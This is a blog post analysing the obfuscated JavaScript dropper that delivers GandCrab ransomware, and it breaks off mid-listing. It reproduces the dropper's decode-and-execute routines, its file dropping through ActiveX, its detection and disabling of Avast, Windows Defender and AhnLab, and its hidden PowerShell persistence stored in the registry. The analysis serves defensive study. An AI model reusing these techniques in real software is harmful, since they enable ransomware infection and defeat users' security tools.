<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Gandcrab v5.0.3 detail analysis of javascript delivery payload - D3xt3r&#039;s Laboratory</title><meta description="Recently a friend of mine shared with me a Javascript file which on execution resulted in machine been infected by GandCrab ransomeware. Initial through was that it must be the Javascript implementati"><meta property="og:type" content="article"><meta property="og:title" content="Gandcrab v5.0.3 detail analysis of javascript delivery payload"><meta property="og:url" content="https://www.taintedbits.com/2018/10/18/gandcrab-detail-analysis-of-js-delivery-payload/"><meta property="og:site_name" content="D3xt3r&#039;s Laboratory"><meta property="og:description" content="Recently a friend of mine shared with me a Javascript file which on execution resulted in machine been infected by GandCrab ransomeware. Initial through was that it must be the Javascript implementati"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/img/og_image.png"><meta property="article:published_time" content="2018-10-18T10:36:23.000Z"><meta property="article:modified_time" content="2020-01-27T11:59:13.210Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Windows Malware"><meta property="article:tag" content="javascript obfuscation"><meta property="article:tag" content="GandCrab"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2018/10/18/gandcrab-detail-analysis-of-js-delivery-payload/"},"headline":"D3xt3r's Laboratory","image":["https://www.taintedbits.com/img/og_image.png"],"datePublished":"2018-10-18T10:36:23.000Z","dateModified":"2020-01-27T11:59:13.210Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Recently a friend of mine shared with me a Javascript file which on execution resulted in machine been infected by GandCrab ransomeware. Initial through was that it must be the Javascript implementati"}</script><link rel="alternative" href="/atom.xml" title="D3xt3r&#039;s Laboratory" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="D3xt3r&#039;s Laboratory" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publications</a><a class="navbar-item" href="/cve">CVE</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" datetime="2018-10-18T10:36:23.000Z" title="2018-10-18T10:36:23.000Z">2018-10-18</time><span class="level-item"><a class="link-muted" href="/categories/Malware-Analysis/">Malware Analysis</a></span><span class="level-item">25 minutes read (About 3757 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Gandcrab v5.0.3 detail analysis of javascript delivery payload</h1><div class="content"><p>Recently a friend of mine shared with me a Javascript file which on execution resulted in machine been infected by GandCrab ransomeware. Initial through was that it must be the Javascript implementation of ransomeware, but assumption tuned out to be wrong, the code was actually heavily obfuscated and it dropped the actual GandCrab binary (v5.0.3) which did the encryption. The Javascript code did lots of other technology like using Powershell script and ActiveXObject in order to evade detection.</p><a id="more"></a><p>Below is the detail analysis of GandCrab:</p><p>The javascript code heavily relies on ActiveX technology to carry out its functionality like executing shell/powershell command and dropping files. The javascript code is also heavily obfuscated with string obfuscation techniques.</p><p>To those who don’t know what ActiveX is? Its a software framework limited to Internet Explorer on Windows but you can install ActiveX plugin for chrome and Firefox. The danger of this software lies in its ability to allows access/execute data/code in the operating system outside the browser sandbox. This feature is heavily exploited by this GandCrab javascript code with appropriate browser security settings it could have been avoided.</p><h1><span id="layer-one-obfuscated-payload">Layer One obfuscated payload</span></h1><p>When the javascript script file was opened there were many variables with very lengthly values which was decrypted dynamically and obfuscated as we will progress with the analysis you will realized that there were multiple layers of obfuscation to avoided antivirus detection. The simplified code looks as shown below :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// completely useless code</span></span><br><span class="line"><span class="keyword">var</span> gveyimd = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="comment">// add some time delay</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> cpedcxyfdmsl =  <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  <span class="keyword">if</span> ((cpedcxyfdmsl - gveyimd) &gt; (<span class="number">942</span> + <span class="number">58</span>)) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// very lengthly payload</span></span><br><span class="line"><span class="keyword">var</span> layer_one_encrypted_payload = <span class="string">'886.....502'</span>;</span><br><span class="line"><span class="comment">// decrypt the obfuscated payload</span></span><br><span class="line"><span class="keyword">var</span> layer_one_decrypted_payload = layer_one_encrypted_payload.replace(<span class="regexp">/(\d&#123;2&#125;)/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> payload</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(payload, <span class="number">10</span>) + <span class="number">30</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exePayload</span>(<span class="params">payload</span>) </span>&#123;</span><br><span class="line">  (<span class="built_in">Function</span>(payload)());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute the decypted payload</span></span><br><span class="line">exePayload(layer_one_decrypted_payload);</span><br></pre></td></tr></table></figure><p>The above de-obfuscation technique is again used by other javascript code with is dropped to kill antivirus softwares.</p><p>The above code de-obfuscation the first layer of obfuscation and runs the decrypted javascript code. This code is responsible for the following functions :</p><ol><li>Detect and kill <strong>Avast antivirus service</strong></li><li>Detect and kill <strong>Windows Defender service</strong></li><li>Detect and kill <strong>Microsoft Network Realtime Inspection Service</strong></li><li>Detect and kill <strong>Ahnlab v3 internet security</strong></li><li>Drop and execute GandCrabV5.0.3.</li></ol><p>The skeleton of the de-obfuscated code is as show below :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptAndDrop</span>(<span class="params">ecryptedPayload, outputFileName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// decrypt and drop the payload</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runShellCommand</span>(<span class="params">shellCommand</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// run shell command</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getServiceStatus</span>(<span class="params">serviceName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// gets all the service passed in the parameter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'avast! Antivirus'</span>)) &#123;</span><br><span class="line"><span class="comment">// kill Avast antivirus if detected running</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((getServiceStatus(<span class="string">'WdNisSvc'</span>)) || (getServiceStatus(<span class="string">'WinDefend'</span>))) &#123;</span><br><span class="line">  <span class="comment">// DISABLE Windows Defender if detected running</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'NisSrv'</span>))</span><br><span class="line"><span class="comment">// DISABLE Window antivirus if detected running</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'V3 Service'</span>)) &#123;</span><br><span class="line">  <span class="comment">// Uninstall Ahnlabs if detected running</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// drop and execute GandCrab binary</span></span><br></pre></td></tr></table></figure><p>As we progress with the analysis we will see the detail explanation of each functionality, lets start with the basic function with are used used by the first layer of the code:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bewktojmagvc = <span class="keyword">new</span> ActiveXObject(<span class="string">'Scripting.FileSystemObject'</span>);</span><br><span class="line"><span class="keyword">var</span> zevdbpspf = WScript.CreateObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">var</span> malScriptPath = zevdbpspf.ExpandEnvironmentStrings(<span class="string">"%USERPROFILE%"</span>) + <span class="string">"\\"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptAndDrop</span>(<span class="params">ecryptedPayload, outputFileName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// decrypt and drop the payload</span></span><br><span class="line">  <span class="keyword">var</span> ecryptedPayloadClean = ecryptedPayload.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">  decyptedPayload = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (ecryptedPayloadClean.length / <span class="number">2</span>); i++) &#123;</span><br><span class="line">    decyptedPayload += <span class="built_in">String</span>.fromCharCode(<span class="string">'0x'</span> + ecryptedPayloadClean.substr(i * <span class="number">2</span>, <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> payloadFile = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>);</span><br><span class="line">  payloadFile.Type = <span class="number">2</span>;</span><br><span class="line">  payloadFile.Charset = <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">  payloadFile.Open();</span><br><span class="line">  payloadFile.WriteText(decyptedPayload);</span><br><span class="line">  payloadFile.SaveToFile(outputFileName, <span class="number">2</span>);</span><br><span class="line">  payloadFile.Close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above function decrypts the payload passed as parameter and drops the file with the name specified in the second parameter. All the output files are drop in <strong>USERPROFILE</strong> directory.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runShellCommand</span>(<span class="params">shellCommand</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> osShell = WScript.CreateObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">  <span class="keyword">var</span> cmdResponse = osShell.Exec(shellCommand);</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cmdResponse.Status == <span class="number">0</span>) &#123;</span><br><span class="line">      WScript.Sleep(<span class="number">100</span>);</span><br><span class="line">      i++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1800</span>) &#123;</span><br><span class="line">      cmdResponse.Terminate();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above function runs the shell command as passed as first parameter. If the command was not successful then it goes to sleeps for 100 ms and retries it again. Retries goes on for maximum of 1800 time, if still unsuccessful then it kill this shell.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getServiceStatus</span>(<span class="params">serviceName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// gets all the service passed in the parameter</span></span><br><span class="line">  <span class="keyword">var</span> serviceObj = GetObject(<span class="string">"winmgmts:"</span>).ExecQuery(<span class="string">"SELECT * FROM Win32_Service WHERE Name='"</span> + serviceName + <span class="string">"'"</span>);</span><br><span class="line">  vaatgfp = <span class="keyword">new</span> Enumerator(serviceObj);</span><br><span class="line">  xcabb = vaatgfp.item();</span><br><span class="line">  <span class="keyword">var</span> bfdln = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    bfdln = xcabb.State;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  <span class="keyword">if</span> (bfdln == <span class="string">'Running'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function get the status of service, it returns either true or false. The name of the service is passed as parameter to the function. This function is used many time in the script.</p><h1><span id="killing-avast-antivirus">Killing Avast Antivirus</span></h1><p>In the main javascript code first check if the <em>Avast antivirus</em> service is present? if it is. Then it drops and executes the <em>kyoxks.js</em> which is responsible for killing of antivirus. Below is the code with does that :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pjqssmaj = <span class="string">'B392....67'</span>;</span><br><span class="line"><span class="keyword">if</span> (getServiceStatus(<span class="string">'avast! Antivirus'</span>)) &#123;</span><br><span class="line">  decryptAndDrop(pjqssmaj, malScriptPath + <span class="string">'kyoxks.js'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    runShellCommand(<span class="string">'wscript.exe "'</span> + malScriptPath + <span class="string">'kyoxks.js"'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  WScript.sleep(<span class="number">15000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The decrypted script <em>kyoxks.js</em> as shown below:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> windowsShell = WScript.CreateObject(<span class="string">"shell.application"</span>);</span><br><span class="line"><span class="keyword">var</span> ligslo = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">var</span> mirzgxodyv = GetObject(<span class="string">"winmgmts:\\\\.\\root\\CIMV2"</span>);</span><br><span class="line"><span class="keyword">var</span> xuzvgzuuqvg = mirzgxodyv.ExecQuery(<span class="string">"SELECT * FROM Win32_OperatingSystem"</span>, <span class="string">"WQL"</span>, <span class="number">0x10</span> | <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> cruijgvvr = <span class="keyword">new</span> Enumerator(xuzvgzuuqvg);</span><br><span class="line"><span class="keyword">var</span> vzryitg = cruijgvvr.item();</span><br><span class="line"><span class="keyword">var</span> htklccofp = vzryitg.SystemDirectory;</span><br><span class="line"><span class="keyword">var</span> fllijjwjsw = vzryitg.Version;</span><br><span class="line"><span class="keyword">var</span> arr = fllijjwjsw.split(<span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// lengthy Base64 encoded powershell payload</span></span><br><span class="line"><span class="keyword">var</span> nfdmkk = <span class="string">'[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABhAD.....sAfQA=")) | Invoke-Expression'</span>;</span><br><span class="line"></span><br><span class="line">ligslo.RegWrite(<span class="string">"HKEY_CURRENT_USER\\SOFTWARE\\ycsdrr\\pvrylqzhlnv"</span>, nfdmkk, <span class="string">"REG_SZ"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kolhp = <span class="string">'powershell -windowstyle hidden -command "(Get-ItemProperty -path HKCU:\\\\SOFTWARE\\\\ycsdrr).pvrylqzhlnv | Invoke-\'\'Expression\\\\\\"'</span>;</span><br></pre></td></tr></table></figure><p>The function of the above script is :</p><ol><li>Write Base64 encoded Unicode PowerShell scripting code to the registry key. This PowerShell code will be scheduled to run at regular interval in the later part of the script.</li><li>The corresponding registry key is <strong>HKEY_CURRENT_USER\SOFTWARE\ycsdrr\pvrylqzhlnv</strong>.</li><li>After writing the above PowerShell command code to the registry it schedules it to run it regularly.</li></ol><p>The variable <em>nfdmkk</em> is a base64 encoded Unicode String above, and decoded sting it is as follows:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a1</span> = <span class="variable">$env:</span> temp;</span><br><span class="line"><span class="variable">$a1</span> = <span class="variable">$a1</span> + <span class="string">'\_av_iup.tm~a01\'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span> = (Get - <span class="keyword">Process</span> - Name AvastUI) | Split - Path;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="literal">-Path</span> <span class="variable">$a2</span> )&#123;</span><br><span class="line">  <span class="keyword">if</span>(!(<span class="built_in">Test-Path</span> <span class="literal">-Path</span> <span class="variable">$a1</span> ))&#123;</span><br><span class="line">    <span class="built_in">New-Item</span> <span class="literal">-ItemType</span> directory <span class="literal">-Path</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup prod - pgm.vpx '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup products.def '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup uat.vpx '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup HTMLayout.dll '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup part - prg_ais - 1206092 d.vpx '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="built_in">Copy-Item</span> <span class="variable">$a2</span><span class="string">'setup part - setup_ais - 1206092 d.vpx '</span> <span class="literal">-Destination</span> <span class="variable">$a1</span>;</span><br><span class="line">    <span class="variable">$a3</span> = <span class="variable">$a2</span> + <span class="string">'setup instup.exe '</span>;</span><br><span class="line">    <span class="variable">$a4</span> = <span class="string">'/prod:ais /sfx:clear /sfxstorage:"'</span>+<span class="variable">$a1</span>+<span class="string">'" /wait '</span>;</span><br><span class="line">    <span class="built_in">start-process</span> <span class="variable">$a3</span> <span class="variable">$a4</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">"a c# code showed in next section"</span>;</span><br></pre></td></tr></table></figure><p>The Powershell script above does the following function:</p><ol><li>Copy the corresponding software files to the temporary directory.</li><li>Find and start the Avast update program.</li><li>Clear the cached data.</li><li>Interesting powershell script also adds a type with Add-Type, which is the c# code which is as shown below.</li></ol><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">a12</span> &#123;</span><br><span class="line">   [<span class="meta">return: MarshalAs(UnmanagedType.Bool)</span>]</span><br><span class="line"></span><br><span class="line">   [<span class="meta">DllImport(<span class="meta-string">""</span>user32.dll<span class="meta-string">""</span>, SetLastError = true, CharSet = CharSet.Auto)</span>]</span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">PostMessage</span>(<span class="params">IntPtr a15, <span class="keyword">uint</span> Msg, IntPtr wParam, IntPtr lParam</span>)</span>;</span><br><span class="line"></span><br><span class="line">   [<span class="meta">DllImport(<span class="meta-string">""</span>user32.dll<span class="meta-string">""</span>, EntryPoint = <span class="meta-string">""</span>FindWindowEx<span class="meta-string">""</span>, CharSet = CharSet.Auto)</span>]</span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">FindWindowEx</span>(<span class="params">IntPtr a15Parent, IntPtr a15ChildAfter, <span class="keyword">string</span> lpszClass, <span class="keyword">string</span> lpszWindow</span>)</span>;</span><br><span class="line">   [<span class="meta">DllImport(<span class="meta-string">""</span>user32.dll<span class="meta-string">""</span>)</span>] [<span class="keyword">return</span>: MarshalAs(UnmanagedType.Bool)] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">IsWindowVisible</span>(<span class="params">IntPtr a15</span>)</span>;</span><br><span class="line"></span><br><span class="line">   [<span class="meta">DllImport(<span class="meta-string">""</span>user32.dll<span class="meta-string">""</span>, SetLastError = true)</span>]</span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">uint</span> <span class="title">GetWindowThreadProcessId</span>(<span class="params">IntPtr a15, <span class="keyword">out</span> <span class="keyword">uint</span> lpdwProcessId</span>)</span>;</span><br><span class="line"></span><br><span class="line">   [<span class="meta">DllImport(<span class="meta-string">""</span>user32.dll<span class="meta-string">""</span>)</span>]</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">ShowWindow</span>(<span class="params">IntPtr a15, Int32 nCmdShow</span>)</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntPtr <span class="title">a10</span>(<span class="params"><span class="keyword">string</span> windowTitle, <span class="keyword">int</span> ProcessID</span>)</span> &#123;</span><br><span class="line">     IntPtr retIntPtr = IntPtr.Zero;</span><br><span class="line">     <span class="keyword">int</span> maxCount = <span class="number">9999</span>;</span><br><span class="line">     <span class="keyword">int</span> ct = <span class="number">0</span>;</span><br><span class="line">     IntPtr prevChild = IntPtr.Zero;</span><br><span class="line">     IntPtr currChild = IntPtr.Zero;</span><br><span class="line">     <span class="keyword">while</span>(<span class="literal">true</span> &amp;&amp; ct &lt; maxCount) &#123;</span><br><span class="line">       currChild = FindWindowEx(IntPtr.Zero, prevChild, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">       <span class="keyword">if</span> (currChild == IntPtr.Zero)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">if</span> (IsWindowVisible(currChild)) &#123;</span><br><span class="line">         <span class="keyword">uint</span> procID = <span class="number">0</span>;</span><br><span class="line">         GetWindowThreadProcessId(currChild, <span class="keyword">out</span> procID);</span><br><span class="line">         <span class="keyword">if</span> (procID == ProcessID) &#123;</span><br><span class="line">           retIntPtr = currChild;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       prevChild = currChild;</span><br><span 